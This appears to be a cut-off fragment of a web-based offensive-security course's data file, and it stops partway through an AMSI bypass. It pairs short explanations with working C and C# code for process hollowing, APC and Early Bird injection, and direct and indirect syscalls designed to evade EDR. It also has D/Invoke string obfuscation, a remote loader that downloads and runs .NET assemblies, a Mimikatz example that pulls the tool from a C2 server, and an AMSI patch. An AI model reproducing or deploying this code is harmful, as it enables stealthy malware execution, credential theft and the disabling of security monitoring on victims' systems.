// Link ntdll for native APIs
#pragma comment(lib, "ntdll.lib")

// Function pointer for NtUnmapViewOfSection
typedef NTSTATUS (WINAPI *pfnNtUnmapViewOfSection)(
    HANDLE, PVOID);

BOOL ProcessHollowing(const char* szTarget,
                      const char* szPayload) {
    
    // 1. Read malicious PE
    HANDLE hFile = CreateFileA(szPayload,
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, 0, NULL);
    
    DWORD dwSize = GetFileSize(hFile, NULL);
    BYTE* pImage = (BYTE*)malloc(dwSize);
    ReadFile(hFile, pImage, dwSize, &dwSize, NULL);
    CloseHandle(hFile);
    
    // 2. Create target in suspended state
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    if (!CreateProcessA(szTarget, NULL, NULL, NULL,
        FALSE, CREATE_SUSPENDED, NULL, NULL,
        &si, &pi)) {
        printf("[-] CreateProcess failed\\n");
        return FALSE;
    }
    
    printf("[+] Created suspended process: %lu\\n", 
           pi.dwProcessId);
    
    // 3. Get base address from PEB
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    // Rdx points to PEB on x64
    PVOID pPeb = (PVOID)ctx.Rdx;
    PVOID pImageBase;
    
    // ImageBase is at PEB + 0x10
    ReadProcessMemory(pi.hProcess,
        (BYTE*)pPeb + 0x10,
        &pImageBase, sizeof(pImageBase), NULL);
    
    printf("[+] Original image base: %p\\n", 
           pImageBase);
    
    // 4. Unmap original image
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pfnNtUnmapViewOfSection NtUnmap = 
        (pfnNtUnmapViewOfSection)GetProcAddress(
            hNtdll, "NtUnmapViewOfSection");
    
    NtUnmap(pi.hProcess, pImageBase);
    
    // 5. Parse PE headers
    PIMAGE_DOS_HEADER pDos = 
        (PIMAGE_DOS_HEADER)pImage;
    PIMAGE_NT_HEADERS pNt = 
        (PIMAGE_NT_HEADERS)(pImage + 
                            pDos->e_lfanew);
    
    // 6. Allocate new memory
    PVOID pNewBase = VirtualAllocEx(pi.hProcess,
        pImageBase, pNt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    
    if (!pNewBase) {
        printf("[-] VirtualAllocEx failed\\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // 7. Write PE headers
    WriteProcessMemory(pi.hProcess, pNewBase,
        pImage, pNt->OptionalHeader.SizeOfHeaders,
        NULL);
    
    // 8. Write sections
    PIMAGE_SECTION_HEADER pSect = IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            (BYTE*)pNewBase + pSect[i].VirtualAddress,
            pImage + pSect[i].PointerToRawData,
            pSect[i].SizeOfRawData, NULL);
    }
    
    // 9. Update entry point
    ctx.Rcx = (DWORD64)pNewBase + 
              pNt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    
    // 10. Resume execution
    printf("[+] Resuming process...\\n");
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    free(pImage);
    
    return TRUE;
}`,
          language: "c"
        },
        {
          title: "3. APC Queue Injection - Stealthy Execution",
          content: `APC (Asynchronous Procedure Call) injection queues your code to execute when a thread enters an alertable wait state. More stealthy than CreateRemoteThread as it uses Windows' legitimate alerting mechanism.

HOW IT WORKS:
• Every thread has an APC queue
• When thread enters alertable wait (SleepEx, WaitForSingleObjectEx), APCs execute
• QueueUserAPC adds function to execute
• No CreateRemoteThread = less detection

BEST TARGET THREADS:
• GUI threads (always alertable for messages)
• Threads calling Sleep/WaitForSingleObject
• Worker threads in thread pools`,
          code: `#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Shellcode to execute via APC
// This would be your actual payload
unsigned char shellcode[] = {
    0x90, 0x90, 0x90,  // NOPs (replace with real shellcode)
    0xC3                // RET
};

BOOL InjectAPC(DWORD dwPid) {
    // 1. Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, dwPid);
    
    if (!hProcess) {
        printf("[-] OpenProcess failed\\n");
        return FALSE;
    }
    
    // 2. Allocate executable memory
    LPVOID pRemoteBuf = VirtualAllocEx(hProcess,
        NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    
    if (!pRemoteBuf) {
        printf("[-] VirtualAllocEx failed\\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 3. Write shellcode
    if (!WriteProcessMemory(hProcess, pRemoteBuf,
        shellcode, sizeof(shellcode), NULL)) {
        printf("[-] WriteProcessMemory failed\\n");
        VirtualFreeEx(hProcess, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] Shellcode written to %p\\n", 
           pRemoteBuf);
    
    // 4. Enumerate threads
    HANDLE hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD, 0);
    
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    
    int queuedCount = 0;
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            // Only queue to target process threads
            if (te.th32OwnerProcessID == dwPid) {
                HANDLE hThread = OpenThread(
                    THREAD_SET_CONTEXT, FALSE,
                    te.th32ThreadID);
                
                if (hThread) {
                    // Queue APC to thread
                    QueueUserAPC(
                        (PAPCFUNC)pRemoteBuf,
                        hThread, 0);
                    
                    queuedCount++;
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    
    printf("[+] Queued APC to %d threads\\n", 
           queuedCount);
    printf("[*] Waiting for alertable wait...\\n");
    
    CloseHandle(hProcess);
    return TRUE;
}

// ADVANCED: Early Bird APC
// Inject before process starts executing

BOOL EarlyBirdAPC(const char* szTarget) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Create suspended
    CreateProcessA(szTarget, NULL, NULL, NULL,
        FALSE, CREATE_SUSPENDED, NULL, NULL,
        &si, &pi);
    
    // Allocate and write shellcode
    LPVOID pBuf = VirtualAllocEx(pi.hProcess,
        NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    
    WriteProcessMemory(pi.hProcess, pBuf,
        shellcode, sizeof(shellcode), NULL);
    
    // Queue APC before process starts
    QueueUserAPC((PAPCFUNC)pBuf, 
                 pi.hThread, 0);
    
    // Resume - APC executes immediately
    ResumeThread(pi.hThread);
    
    printf("[+] Early Bird APC executed\\n");
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}`,
          language: "c"
        }
      ]
    },
    "syscalls": {
      title: "Direct Syscalls & Native API",
      sections: [
        {
          title: "1. Understanding System Service Numbers (SSN)",
          content: `Every Windows API call eventually invokes a syscall. The System Service Number (SSN) identifies which kernel function to execute. EDRs hook user-mode APIs (ntdll.dll), but direct syscalls bypass these hooks.

SSN LOCATION:
• Each Nt* function in ntdll.dll contains its SSN
• First instruction: MOV R10, RCX (save arg)
• Second instruction: MOV EAX, SSN
• Third instruction: SYSCALL

EXAMPLE (NtReadVirtualMemory):
  4C 8B D1          mov r10, rcx
  B8 3F 00 00 00    mov eax, 0x3F    ; SSN = 0x3F
  0F 05             syscall

WHY THIS MATTERS:
• SSNs change between Windows versions
• Direct syscalls skip ntdll hooks entirely
• EDR cannot monitor what they can't see`,
          code: `#include <windows.h>
#include <stdio.h>

// Define native API structures
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

// Parse SSN from function
DWORD GetSSN(BYTE* pFunc) {
    // Check for MOV EAX, imm32
    // Bytes: B8 XX XX XX XX
    if (pFunc[0] == 0x4C &&   // mov r10, rcx
        pFunc[3] == 0xB8) {   // mov eax, imm32
        // SSN is 4 bytes after 0xB8
        return *(DWORD*)(pFunc + 4);
    }
    
    return 0xFFFFFFFF;
}

void DemoSSNExtraction() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    // Get function addresses
    BYTE* pNtReadVM = (BYTE*)GetProcAddress(
        hNtdll, "NtReadVirtualMemory");
    BYTE* pNtWriteVM = (BYTE*)GetProcAddress(
        hNtdll, "NtWriteVirtualMemory");
    BYTE* pNtAllocVM = (BYTE*)GetProcAddress(
        hNtdll, "NtAllocateVirtualMemory");
    
    // Extract SSNs
    DWORD ssnRead = GetSSN(pNtReadVM);
    DWORD ssnWrite = GetSSN(pNtWriteVM);
    DWORD ssnAlloc = GetSSN(pNtAllocVM);
    
    printf("NtReadVirtualMemory SSN: 0x%X\\n", 
           ssnRead);
    printf("NtWriteVirtualMemory SSN: 0x%X\\n", 
           ssnWrite);
    printf("NtAllocateVirtualMemory SSN: 0x%X\\n",
           ssnAlloc);
}

// Manual syscall stub (x64)
// This would be in assembly file

extern "C" NTSTATUS SysNtReadVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesRead
);

// In .asm file (NASM syntax):
/*
BITS 64
DEFAULT REL

global SysNtReadVirtualMemory

SysNtReadVirtualMemory:
    mov r10, rcx
    mov eax, 0x3F        ; SSN for NtReadVirtualMemory
    syscall
    ret
*/

// Usage
void DirectSyscallExample() {
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, 1234);
    
    BYTE buffer[256];
    SIZE_T bytesRead;
    
    // Direct syscall - bypasses hooks!
    NTSTATUS status = SysNtReadVirtualMemory(
        hProcess,
        (PVOID)0x400000,
        buffer,
        sizeof(buffer),
        &bytesRead
    );
    
    if (status == 0) {  // STATUS_SUCCESS
        printf("[+] Read %zu bytes\\n", bytesRead);
    }
    
    CloseHandle(hProcess);
}`,
          language: "c"
        },
        {
          title: "2. Hell's Gate - Dynamic SSN Resolution",
          content: `Hell's Gate technique dynamically resolves SSNs at runtime by parsing ntdll.dll. This handles different Windows versions without hardcoding SSNs.

THE PROBLEM:
• SSNs differ: Win10 vs Win11
• SSNs change with updates
• Hardcoded SSNs = brittle code

HELL'S GATE SOLUTION:
1. Find function in ntdll.dll
2. Parse first few bytes
3. Extract SSN from MOV EAX
4. Store for syscall stub

DETECTION EVASION:
• No hardcoded SSNs in binary
• Works across Windows versions
• Adapts to system automatically`,
          code: `#include <windows.h>
#include <stdio.h>

typedef struct _SYSCALL_STUB {
    DWORD ssn;           // System Service Number
    PVOID pSyscallAddr;  // Address of syscall instruction
} SYSCALL_STUB;

// Parse SSN with hook detection
BOOL GetSSN_HellsGate(const char* szFunc,
                      SYSCALL_STUB* stub) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(
        hNtdll, szFunc);
    
    if (!pFunc) return FALSE;
    
    // Check for hooks (JMP instruction)
    if (pFunc[0] == 0xE9 || pFunc[0] == 0xEB) {
        printf("[!] %s appears hooked!\\n", szFunc);
        // Fall back to nearby function or fail
        return FALSE;
    }
    
    // Pattern: 4C 8B D1 B8 [SSN] 00 00 00
    if (pFunc[0] == 0x4C &&
        pFunc[1] == 0x8B &&
        pFunc[2] == 0xD1 &&
        pFunc[3] == 0xB8) {
        
        stub->ssn = *(DWORD*)(pFunc + 4);
        
        // Find syscall instruction
        for (int i = 0; i < 32; i++) {
            if (pFunc[i] == 0x0F && 
                pFunc[i+1] == 0x05) {
                stub->pSyscallAddr = &pFunc[i];
                return TRUE;
            }
        }
    }
    
    return FALSE;
}

// Halo's Gate enhancement
// If function is hooked, check neighbors
BOOL GetSSN_HalosGate(const char* szFunc,
                      SYSCALL_STUB* stub) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(
        hNtdll, szFunc);
    
    // Try function itself
    if (GetSSN_HellsGate(szFunc, stub))
        return TRUE;
    
    printf("[*] Function hooked, trying neighbors\\n");
    
    // Function is hooked, check nearby functions
    // SSNs are sequential in ntdll
    
    BYTE* pCurrent = pFunc;
    
    // Check down (next functions)
    for (int i = 1; i <= 5; i++) {
        // Skip to next function (average ~32 bytes)
        pCurrent += 32;
        
        // Check pattern
        if (pCurrent[0] == 0x4C &&
            pCurrent[1] == 0x8B &&
            pCurrent[2] == 0xD1 &&
            pCurrent[3] == 0xB8) {
            
            DWORD neighborSSN = *(DWORD*)(pCurrent + 4);
            // Our SSN is likely neighborSSN - i
            stub->ssn = neighborSSN - i;
            
            // Find syscall instruction
            for (int j = 0; j < 32; j++) {
                if (pCurrent[j] == 0x0F &&
                    pCurrent[j+1] == 0x05) {
                    stub->pSyscallAddr = &pCurrent[j];
                    printf("[+] Resolved SSN via neighbor: 0x%X\\n",
                           stub->ssn);
                    return TRUE;
                }
            }
        }
    }
    
    return FALSE;
}

// Dynamic syscall function
typedef NTSTATUS (*fnSyscall)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

NTSTATUS DynamicSyscall(SYSCALL_STUB* stub,
    HANDLE hProcess, PVOID addr, PVOID buf,
    SIZE_T size, PSIZE_T read) {
    
    // Build syscall on stack
    BYTE syscallStub[] = {
        0x4C, 0x8B, 0xD1,              // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, SSN
        0x0F, 0x05,                     // syscall
        0xC3                            // ret
    };
    
    // Patch in SSN
    *(DWORD*)(syscallStub + 4) = stub->ssn;
    
    // Make executable
    DWORD oldProtect;
    VirtualProtect(syscallStub, sizeof(syscallStub),
                   PAGE_EXECUTE_READ, &oldProtect);
    
    // Execute
    fnSyscall pSyscall = (fnSyscall)syscallStub;
    return pSyscall(hProcess, addr, buf, size, read);
}`,
          language: "c"
        },
        {
          title: "3. Indirect Syscalls - Maximum Stealth",
          content: `Indirect syscalls execute the syscall instruction from ntdll.dll itself, making call stack look legitimate. Instead of embedding syscall in your code, jump to ntdll's syscall.

CALL STACK DIFFERENCE:

Direct Syscall:
YourModule.exe → syscall → kernel

Indirect Syscall:
YourModule.exe → ntdll.dll → syscall → kernel

WHY IT MATTERS:
• Call stack analysis looks normal
• syscall from ntdll (expected)
• Harder for EDR to detect
• More stealthy than direct`,
          code: `#include <windows.h>
#include <stdio.h>

typedef struct _SYSCALL_INDIRECT {
    DWORD ssn;
    PVOID pSyscallInstr;  // Actual syscall in ntdll
    PVOID pSyscallRet;    // Return address after syscall
} SYSCALL_INDIRECT;

// Find a clean syscall instruction in ntdll
PVOID FindSyscallGadget() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pBase = (BYTE*)hNtdll;
    
    // Parse PE to get .text section
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = 
        (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    
    PIMAGE_SECTION_HEADER pSect = 
        IMAGE_FIRST_SECTION(pNt);
    
    // Find .text section
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSect[i].Name, ".text") == 0) {
            BYTE* pText = pBase + pSect[i].VirtualAddress;
            SIZE_T textSize = pSect[i].Misc.VirtualSize;
            
            // Search for: syscall; ret (0F 05 C3)
            for (SIZE_T j = 0; j < textSize - 3; j++) {
                if (pText[j] == 0x0F &&
                    pText[j+1] == 0x05 &&
                    pText[j+2] == 0xC3) {
                    return &pText[j];
                }
            }
        }
    }
    
    return NULL;
}

// Setup indirect syscall
BOOL SetupIndirectSyscall(const char* szFunc,
                          SYSCALL_INDIRECT* sc) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, szFunc);
    
    if (!pFunc) return FALSE;
    
    // Get SSN
    if (pFunc[0] == 0x4C && pFunc[3] == 0xB8) {
        sc->ssn = *(DWORD*)(pFunc + 4);
    } else {
        return FALSE;
    }
    
    // Find syscall gadget
    sc->pSyscallInstr = FindSyscallGadget();
    if (!sc->pSyscallInstr) {
        printf("[-] No syscall gadget found\\n");
        return FALSE;
    }
    
    printf("[+] Using syscall at: %p\\n", 
           sc->pSyscallInstr);
    
    return TRUE;
}

// Indirect syscall stub (assembly)
/*
BITS 64
DEFAULT REL

global IndirectSyscall

IndirectSyscall:
    mov r10, rcx                ; Save RCX
    mov eax, [rsp+8]            ; Load SSN from stack
    mov r11, [rsp+16]           ; Load syscall address
    jmp r11                     ; Jump to ntdll's syscall
*/

extern "C" NTSTATUS IndirectSyscall(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T,
    DWORD, PVOID);

// Usage
void IndirectSyscallExample() {
    SYSCALL_INDIRECT sc;
    
    if (!SetupIndirectSyscall("NtReadVirtualMemory", 
                              &sc)) {
        printf("[-] Setup failed\\n");
        return;
    }
    
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, 1234);
    
    BYTE buffer[256];
    SIZE_T bytesRead;
    
    // Indirect syscall
    NTSTATUS status = IndirectSyscall(
        hProcess,
        (PVOID)0x400000,
        buffer,
        sizeof(buffer),
        &bytesRead,
        sc.ssn,              // Pass SSN
        sc.pSyscallInstr     // Pass syscall address
    );
    
    if (status == 0) {
        printf("[+] Read %zu bytes (indirect)\\n", 
               bytesRead);
    }
    
    CloseHandle(hProcess);
}

// Stack spoof for even more stealth
// Modify return address before syscall
void StackSpoofedSyscall() {
    // Advanced: Modify call stack to appear
    // as if called from legitimate Windows module
    // (Left as exercise - research ROP chains)
}`,
          language: "c"
        }
      ]
    },
    "pinvoke": {
      title: "P/Invoke & .NET Interop",
      sections: [
        {
          title: "1. P/Invoke Fundamentals - Calling Native APIs",
          content: `P/Invoke (Platform Invocation Services) allows C# to call native Win32 APIs. This is essential for offensive .NET tools since managed APIs are limited.

HOW IT WORKS:
• CLR loads native DLL (kernel32.dll, ntdll.dll)
• Marshals managed types to native types
• Calls native function
• Marshals return value back to managed

COMMON USE CASES:
• Process injection from C#
• Direct Win32 API access
• Syscalls from .NET
• Memory manipulation`,
          code: `using System;
using System.Runtime.InteropServices;
using System.Text;

class WinAPI {
    // Basic P/Invoke syntax
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    // Marshalling structures
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }
    
    // Character set handling
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    public static extern uint GetModuleFileNameW(
        IntPtr hModule,
        StringBuilder lpFilename,
        uint nSize
    );
    
    // Out parameters
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out int lpNumberOfBytesRead
    );
}

class Program {
    static void Main() {
        // Open process
        uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        IntPtr hProcess = WinAPI.OpenProcess(
            PROCESS_ALL_ACCESS, false, 1234);
        
        if (hProcess == IntPtr.Zero) {
            Console.WriteLine("OpenProcess failed");
            return;
        }
        
        // Read memory
        byte[] buffer = new byte[256];
        int bytesRead;
        
        bool success = WinAPI.ReadProcessMemory(
            hProcess,
            (IntPtr)0x400000,
            buffer,
            buffer.Length,
            out bytesRead
        );
        
        Console.WriteLine($"Read {bytesRead} bytes");
        
        // Get module path
        StringBuilder path = new StringBuilder(260);
        WinAPI.GetModuleFileNameW(
            IntPtr.Zero, path, 260);
        
        Console.WriteLine($"Path: {path}");
        
        WinAPI.CloseHandle(hProcess);
    }
}

// MARSHALLING GUIDE
// =================

// Pointers: IntPtr
// Strings: StringBuilder or string
// Arrays: byte[], int[]
// Structures: [StructLayout]
// Callbacks: delegates
// Handles: IntPtr or SafeHandle

// Common attributes:
// CharSet.Unicode - wchar_t*
// CharSet.Ansi - char*
// SetLastError = true - enables Marshal.GetLastWin32Error()
// CallingConvention - for non-stdcall functions`,
          language: "csharp"
        },
        {
          title: "2. D/Invoke - Dynamic API Resolution",
          content: `D/Invoke dynamically resolves APIs at runtime using GetProcAddress, avoiding static imports that EDR can enumerate. This is P/Invoke's stealthy cousin.

WHY D/INVOKE:
• No imports in PE file
• API names not visible in strings
• Can resolve from memory-mapped DLLs
• Defeats static analysis

THE TECHNIQUE:
1. LoadLibrary or manual map DLL
2. GetProcAddress for function
3. Marshal.GetDelegateForFunctionPointer
4. Call as normal delegate`,
          code: `using System;
using System.Runtime.InteropServices;

class DInvoke {
    // Delegate matching native function signature
    [UnmanagedFunctionPointer(CallingConvention.StdCall,
                              SetLastError = true)]
    public delegate IntPtr OpenProcessDelegate(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId
    );
    
    // Load kernel32.dll
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(
        IntPtr hModule, string lpProcName);
    
    // Generic D/Invoke wrapper
    public static Delegate GetAPIDelegate<T>(
        string moduleName, string functionName) {
        
        // Load DLL
        IntPtr hModule = LoadLibrary(moduleName);
        if (hModule == IntPtr.Zero) {
            throw new Exception("LoadLibrary failed");
        }
        
        // Get function address
        IntPtr pFunc = GetProcAddress(hModule, functionName);
        if (pFunc == IntPtr.Zero) {
            throw new Exception("GetProcAddress failed");
        }
        
        // Convert to delegate
        return Marshal.GetDelegateForFunctionPointer(
            pFunc, typeof(T));
    }
}

class Program {
    static void Main() {
        // Dynamically resolve OpenProcess
        var OpenProcess = (DInvoke.OpenProcessDelegate)
            DInvoke.GetAPIDelegate<DInvoke.OpenProcessDelegate>(
                "kernel32.dll", "OpenProcess");
        
        // Use like normal P/Invoke
        IntPtr hProcess = OpenProcess(
            0x1F0FFF, false, 1234);
        
        Console.WriteLine($"Handle: 0x{hProcess:X}");
        
        // Advanced: Resolve from ntdll
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtReadVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            byte[] Buffer,
            int NumberOfBytesToRead,
            out int NumberOfBytesRead
        );
        
        var NtReadVirtualMemory = 
            (NtReadVirtualMemoryDelegate)
            DInvoke.GetAPIDelegate<NtReadVirtualMemoryDelegate>(
                "ntdll.dll", "NtReadVirtualMemory");
        
        byte[] buffer = new byte[256];
        int bytesRead;
        
        uint status = NtReadVirtualMemory(
            hProcess,
            (IntPtr)0x400000,
            buffer,
            buffer.Length,
            out bytesRead
        );
        
        Console.WriteLine($"NTSTATUS: 0x{status:X}");
    }
}

// OBFUSCATION ENHANCEMENT
// =======================

class ObfuscatedDInvoke {
    // XOR obfuscate strings
    static string Deobfuscate(byte[] data, byte key) {
        char[] result = new char[data.Length];
        for (int i = 0; i < data.Length; i++) {
            result[i] = (char)(data[i] ^ key);
        }
        return new string(result);
    }
    
    static void Main() {
        // Obfuscated "kernel32.dll"
        byte[] dllName = { 
            0x0E, 0x02, 0x11, 0x17, 0x02, 0x05, 
            0x66, 0x65, 0x23, 0x01, 0x05, 0x05 
        };
        
        // Obfuscated "OpenProcess"
        byte[] funcName = {
            0x12, 0x13, 0x02, 0x17, 0x11, 0x11,
            0x0E, 0x02, 0x12, 0x0E
        };
        
        string dll = Deobfuscate(dllName, 0x67);
        string func = Deobfuscate(funcName, 0x67);
        
        // Now resolve dynamically
        // EDR sees no suspicious strings!
    }
}`,
          language: "csharp"
        },
        {
          title: "3. In-Memory Assembly Execution",
          content: `Load and execute .NET assemblies directly from memory without touching disk. Essential for fileless attacks and post-exploitation frameworks.

TECHNIQUES:
• Assembly.Load(byte[]) - load from memory
• Reflection to invoke methods
• Can load dependencies recursively
• Execute .NET executables/DLLs

USE CASES:
• Execute C# payloads in-memory
• Load tools without dropping files
• Chain multiple .NET tools
• Post-exploitation framework`,
          code: `using System;
using System.Reflection;
using System.IO;

class InMemoryExecution {
    // Load and execute assembly from bytes
    public static object ExecuteAssembly(
        byte[] assemblyBytes,
        string className,
        string methodName,
        object[] parameters) {
        
        // Load assembly into memory
        Assembly asm = Assembly.Load(assemblyBytes);
        
        // Get type
        Type type = asm.GetType(className);
        if (type == null) {
            throw new Exception($"Type {className} not found");
        }
        
        // Get method
        MethodInfo method = type.GetMethod(methodName);
        if (method == null) {
            throw new Exception($"Method {methodName} not found");
        }
        
        // Create instance if not static
        object instance = null;
        if (!method.IsStatic) {
            instance = Activator.CreateInstance(type);
        }
        
        // Invoke method
        return method.Invoke(instance, parameters);
    }
    
    // Execute Main() of a .NET executable
    public static void ExecuteProgram(byte[] exeBytes,
                                      string[] args) {
        Assembly asm = Assembly.Load(exeBytes);
        
        // Find entry point
        MethodInfo entry = asm.EntryPoint;
        if (entry == null) {
            throw new Exception("No entry point found");
        }
        
        // Prepare parameters
        object[] parameters = new object[] { args };
        
        // Execute
        entry.Invoke(null, parameters);
    }
}

class Program {
    static void Main() {
        // Example: Load Mimikatz from memory
        byte[] mimikatzBytes = DownloadFromC2();
        
        // Execute
        InMemoryExecution.ExecuteProgram(
            mimikatzBytes,
            new string[] { "sekurlsa::logonpasswords" }
        );
    }
    
    static byte[] DownloadFromC2() {
        // Stub - download from C2 server
        return new byte[0];
    }
}

// ADVANCED: Loading dependencies
class AssemblyResolver {
    public static void SetupResolver() {
        AppDomain.CurrentDomain.AssemblyResolve += 
            ResolveAssembly;
    }
    
    static Assembly ResolveAssembly(
        object sender, ResolveEventArgs args) {
        
        // When .NET can't find assembly, we provide it
        Console.WriteLine($"Resolving: {args.Name}");
        
        // Load from embedded resource or download
        byte[] asmBytes = GetAssemblyBytes(args.Name);
        
        if (asmBytes != null) {
            return Assembly.Load(asmBytes);
        }
        
        return null;
    }
    
    static byte[] GetAssemblyBytes(string name) {
        // Stub - get from resources or C2
        return null;
    }
}

// COMPLETE EXAMPLE: Remote loader
class RemoteLoader {
    static void Main(string[] args) {
        if (args.Length < 2) {
            Console.WriteLine("Usage: loader <url> <args>");
            return;
        }
        
        // Setup dependency resolver
        AssemblyResolver.SetupResolver();
        
        // Download assembly
        using (var wc = new System.Net.WebClient()) {
            byte[] data = wc.DownloadData(args[0]);
            
            // Prepare arguments
            string[] toolArgs = new string[args.Length - 1];
            Array.Copy(args, 1, toolArgs, 0, toolArgs.Length);
            
            // Execute
            InMemoryExecution.ExecuteProgram(data, toolArgs);
        }
        
        Console.WriteLine("[+] Execution complete");
    }
}

// OPSEC CONSIDERATIONS:
// - Assembly.Load triggers ETW events
// - AMSI can scan loaded assemblies
// - Consider AMSI/ETW bypass first
// - Use obfuscation on payload
// - Encrypt during transit`,
          language: "csharp"
        }
      ]
    },
    "evasion": {
      title: "Evasion Techniques - Bypassing Defenses",
      sections: [
        {
          title: "1. AMSI Bypass - Defeating Script Scanning",
          content: `AMSI (Antimalware Scan Interface) scans scripts and in-memory content before execution. Bypassing AMSI is often the first step in post-exploitation.

HOW AMSI WORKS:
• PowerShell/C# calls amsi.dll
• Content sent to AmsiScanBuffer
• AV vendor scans buffer
• Blocks malicious content

BYPASS STRATEGIES:
• Patch AmsiScanBuffer in memory
• Force AMSI initialization failure
• Obfuscate malicious strings
• Unhook amsi.dll functions`,
          code: `using System;
using System.Runtime.InteropServices;

class AMSIBypass {
    // Method 1: Patch AmsiScanBuffer
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(
        IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
    
    public static bool PatchAMSI() {
        try {
            // Load amsi.dll
            IntPtr hAmsi = LoadLibrary("amsi.dll");
            if (hAmsi == IntPtr.Zero) {
                return false;
            }
            
            // Get AmsiScanBuffer address
            IntPtr pAmsiScanBuffer = GetProcAddress(
                hAmsi, "AmsiScanBuffer");
            
            if (pAmsiScanBuffer == IntPtr.Zero) {
                return false;
            }
            
            // Patch with "return 0"
            // x64: B8 57 00 07 80 C3 (mov eax, 0x80070057; ret)
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            
            // Change memory protection
            uint oldProtect;
            if (!VirtualProtect(pAmsiScanBuffer,
                (UIntPtr)patch.Length, 0x40, out oldProtect)) {
                return false;
            }
            
            // Write patch
            Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
            
            // Restore protection
            VirtualProtect(pAmsiScanBuffer,
                (UIntPtr)patch.Length, oldProtect, out oldProtect);
            
            Console.WriteLine("[+] AMSI patched");
            return true;
        }
        catch (Exception ex) {
            Console.WriteLine($"[-] AMSI patch failed: {ex.Message}");
            return false;
        }
    }
    
    // Method 2: Force initialization failure
    [DllImport("amsi.dll")]
